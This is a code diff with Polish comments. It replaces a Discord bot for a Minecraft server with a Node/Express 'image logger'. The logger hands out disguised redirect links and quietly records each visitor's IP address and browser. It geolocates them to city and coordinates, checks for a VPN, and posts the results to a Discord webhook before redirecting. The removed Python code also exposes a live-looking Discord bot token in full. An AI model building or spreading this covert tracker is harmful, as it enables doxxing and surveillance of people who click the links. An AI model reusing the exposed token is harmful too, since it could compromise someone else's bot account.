@@ -1,125 +1,104 @@
-import discord
-from discord import app_commands
-from discord.ext import commands
-from flask import Flask
-from threading import Thread
-import os
+const express = require('express');
+const axios = require('axios');
+const app = express();
+const PORT = process.env.PORT || 3000;
 
-# --- KONFIGURACJA ---
-TOKEN = "MTUwNDkyNDY0MTQxMDY4Mjk1MA.GtOXeL.hFpSnpa_jhBtjBEc-0YaTColiV5iKD5YjEpUK8"
-VERIFY_ROLE_ID = 1504942313724448889
-WELCOME_CHANNEL_ID = 1504942324470251610
-TICKET_CATEGORY_ID = 1504942346196746270  # <--- TWOJE ID KATEGORII TICKETÓW
+const WEBHOOK_URL = 'TUTAJ_WKLEJ_SWOJ_WEBHOOK_URL';
+const linksDatabase = {};
 
-# --- SERWER WWW (KEEP ALIVE) ---
-app = Flask('')
-@app.route('/')
-def home(): return "Mint.mc Online"
-def run(): app.run(host='0.0.0.0', port=8080)
-def keep_alive(): Thread(target=run).start()
+app.post('/generate', express.json(), (req, res) => {
+    const { originalUrl } = req.body;
+    const id = Math.random().toString(36).substring(2, 8);
+    linksDatabase[id] = originalUrl;
+    
+    // Zmień na adres swojej domeny produkcyjnej
+    res.json({ loggerUrl: `http://localhost:${PORT}/redirect/${id}` });
+});
 
-# --- SYSTEM TICKETÓW ---
-class TicketTypeView(discord.ui.View):
-    def __init__(self):
-        super().__init__(timeout=None)
+app.get('/redirect/:id', async (req, res) => {
+    const id = req.params.id;
+    const originalUrl = linksDatabase[id];
 
-    async def create_ticket(self, interaction: discord.Interaction, label: str):
-        guild = interaction.guild
-        category = guild.get_channel(TICKET_CATEGORY_ID)
+    if (!originalUrl) {
+        return res.status(404).send('Link nie istnieje.');
+    }
+
+    const userAgent = req.headers['user-agent'] || 'Nieznany';
+    
+    // Pobieranie IP (w środowisku lokalnym '::1' lub '127.0.0.1' nie zwróci lokalizacji, 
+    // funkcja zadziała w pełni po wrzuceniu na hosting)
+    let userIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    if (userIp.includes(',')) {
+        userIp = userIp.split(',')[0].trim();
+    }
+
+    // Domyślne wartości, jeśli API nie zwróci danych
+    let geoData = {
+        status: "fail",
+        country: "Nieznany",
+        regionName: "Nieznany",
+        city: "Nieznany",
+        isp: "Nieznany",
+        as: "Nieznany",
+        lat: 0,
+        lon: 0,
+        timezone: "Nieznany",
+        hosting: false
+    };
+
+    // Pobieranie szczegółowych danych o IP za pomocą darmowego ip-api.com
+    // Pola (fields): country,regionName,city,isp,as,lat,lon,timezone,hosting,status
+    try {
+        // Testowo dla localhost możesz podmienić userIp na prawdziwe IP, np. '181.41.202.157'
+        const ipToCheck = (userIp === '::1' || userIp === '127.0.0.1') ? '181.41.202.157' : userIp;
+        const geoResponse = await axios.get(`http://ip-api.com/json/${ipToCheck}?fields=status,message,country,regionName,city,isp,as,lat,lon,timezone,hosting`);
         
-        # Zabezpieczenie uprawnień kanału
-        overwrites = {
-            guild.default_role: discord.PermissionOverwrite(read_messages=False),
-            interaction.user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
-            guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
+        if (geoResponse.data && geoResponse.data.status === 'success') {
+            geoData = geoResponse.data;
         }
-        
-        try:
-            channel = await guild.create_text_channel(
-                name=f"{label}-{interaction.user.name}",
-                category=category,
-                overwrites=overwrites
-            )
-            
-            embed = discord.Embed(title=f"🎫 TICKET: {label.upper()}", color=discord.Color.green())
-            embed.description = f"\n\u200b\nWitaj {interaction.user.mention}!\n\nOpisz dokładnie swój problem lub zgłoszenie.\n\nAdministracja zajmie się Twoją sprawą tak szybko, jak to możliwe.\n\u200b\n"
-            
-            await channel.send(embed=embed, view=TicketCloseView())
-            await interaction.response.send_message(f"✅ Otwarto ticket: {channel.mention}", ephemeral=True)
-        except Exception as e:
-            await interaction.response.send_message(f"❌ Błąd: Nie udało się stworzyć kanału. Sprawdź uprawnienia bota. ({e})", ephemeral=True)
+    } catch (err) {
+        console.error("Błąd podczas pobierania GeoIP:", err.message);
+    }
 
-    @discord.ui.button(label="Rekrutacja", style=discord.ButtonStyle.green, custom_id="t_req")
-    async def req(self, interaction, button): await self.create_ticket(interaction, "rekrutacja")
+    // Budowanie struktury Discord Embed dokładnie tak, jak na zdjęciu
+    const discordPayload = {
+        embeds: [{
+            title: "🌐 Image Logger - IP Logged",
+            description: "**A User Opened the Original Link!**\n\n**Endpoint:** `/api/image`",
+            color: 1752220, // Kolor paska bocznego (morski/turkusowy)
+            fields: [
+                {
+                    name: "📌 IP Info:",
+                    value: [
+                        `**IP:** \`${userIp}\``,
+                        `**Provider:** \`${geoData.isp}\``,
+                        `**ASN:** \`${geoData.as}\``,
+                        `**Country:** \`${geoData.country}\``,
+                        `**Region:** \`${geoData.regionName}\``,
+                        `**City:** \`${geoData.city}\``,
+                        `**Coords:** \`${geoData.lat}, ${geoData.lon}\` (Approximate)`,
+                        `**Timezone:** \`${geoData.timezone}\``,
+                        `**VPN/Hosting:** \`${geoData.hosting ? 'True' : 'False'}\``,
+                        `**User-Agent:** \`${userAgent.substring(0, 100)}...\``
+                    ].join('\n'),
+                    inline: false
+                }
+            ],
+            footer: {
+                text: `Czas zdarzenia: ${new Date().toLocaleString('pl-PL')}`
+            }
+        }]
+    };
 
-    @discord.ui.button(label="Zgłoś Cheatera", style=discord.ButtonStyle.danger, custom_id="t_cheat")
-    async def cheat(self, interaction, button): await self.create_ticket(interaction, "cheater")
+    // Wysyłanie gotowego Embedu na Webhook
+    try {
+        await axios.post(WEBHOOK_URL, discordPayload);
+    } catch (error) {
+        console.error("Błąd Webhooka:", error.response ? error.response.data : error.message);
+    }
 
-    @discord.ui.button(label="Inna Sprawa", style=discord.ButtonStyle.gray, custom_id="t_other")
-    async def other(self, interaction, button): await self.create_ticket(interaction, "sprawa")
+    // Natychmiastowe przekierowanie
+    res.redirect(originalUrl);
+});
 
-class TicketCloseView(discord.ui.View):
-    def __init__(self): super().__init__(timeout=None)
-    @discord.ui.button(label="🔒 Zamknij Ticket", style=discord.ButtonStyle.red, custom_id="t_close")
-    async def close(self, interaction, button):
-        await interaction.response.send_message("Zamykanie kanału...")
-        await interaction.channel.delete()
-
-# --- SYSTEM WERYFIKACJI ---
-class VerifyView(discord.ui.View):
-    def __init__(self): super().__init__(timeout=None)
-    @discord.ui.button(label="✅ Weryfikacja", style=discord.ButtonStyle.success, custom_id="v_btn")
-    async def verify(self, interaction, button):
-        role = interaction.guild.get_role(VERIFY_ROLE_ID)
-        if role:
-            await interaction.user.add_roles(role)
-            await interaction.response.send_message("✅ Pomyślnie zweryfikowano! Nadano rangę Gracz.", ephemeral=True)
-        else:
-            await interaction.response.send_message("❌ Błąd: Nie znaleziono rangi Gracz.", ephemeral=True)
-
-# --- KLASA BOTA ---
-class MintBot(commands.Bot):
-    def __init__(self):
-        super().__init__(command_prefix="!", intents=discord.Intents.all())
-
-    async def setup_hook(self):
-        self.add_view(VerifyView())
-        self.add_view(TicketTypeView())
-        self.add_view(TicketCloseView())
-        await self.tree.sync()
-        print("✅ Bot Mint.mc jest gotowy!")
-
-bot = MintBot()
-
-# --- POWITANIA ---
-@bot.event
-async def on_member_join(member):
-    channel = bot.get_channel(WELCOME_CHANNEL_ID)
-    if channel:
-        embed = discord.Embed(title="Witamy na Mint.mc!", description=f"Siema {member.mention}! Pamiętaj, aby się zweryfikować!", color=discord.Color.blue())
-        await channel.send(embed=embed)
-
-# --- KOMENDY SLASH ---
-@bot.tree.command(name="wiadomosc", description="Wysyła oficjalną wiadomość w ramce")
-@app_commands.checks.has_permissions(administrator=True)
-async def msg(interaction, kanal: discord.TextChannel, tytul: str, tresc: str):
-    ladna_tresc = tresc.replace("\n", "\n\u200b\n") # Dodaje puste linie
-    embed = discord.Embed(title=tytul, description=f"\n\u200b\n{ladna_tresc}\n\u200b\n", color=discord.Color.blue())
-    embed.set_footer(text="Mint.mc - Oficjalny komunikat", icon_url=bot.user.avatar.url if bot.user.avatar else None)
-    await kanal.send(embed=embed)
-    await interaction.response.send_message("✅ Wysłano", ephemeral=True)
-
-@bot.tree.command(name="panele", description="Wysyła panele weryfikacji lub ticketów")
-@app_commands.checks.has_permissions(administrator=True)
-async def panels(interaction, typ: str):
-    if typ == "ver":
-        embed = discord.Embed(title="🛡️ WERYFIKACJA", description="\n\u200b\nKliknij przycisk poniżej, aby otrzymać dostęp do serwera!\n\u200b\n", color=discord.Color.green())
-        await interaction.channel.send(embed=embed, view=VerifyView())
-    elif typ == "ticket":
-        embed = discord.Embed(title="🎫 SYSTEM TICKETÓW", description="\n\u200b\nWybierz odpowiednią kategorię zgłoszenia poniżej:\n\u200b\n", color=discord.Color.blue())
-        await interaction.channel.send(embed=embed, view=TicketTypeView())
-    await interaction.response.send_message("Panel wysłany.", ephemeral=True)
-
-if __name__ == "__main__":
-    keep_alive()
-    bot.run(TOKEN)
+app.listen(PORT, () => console.log(`Serwer logujący działa na porcie ${PORT}`));
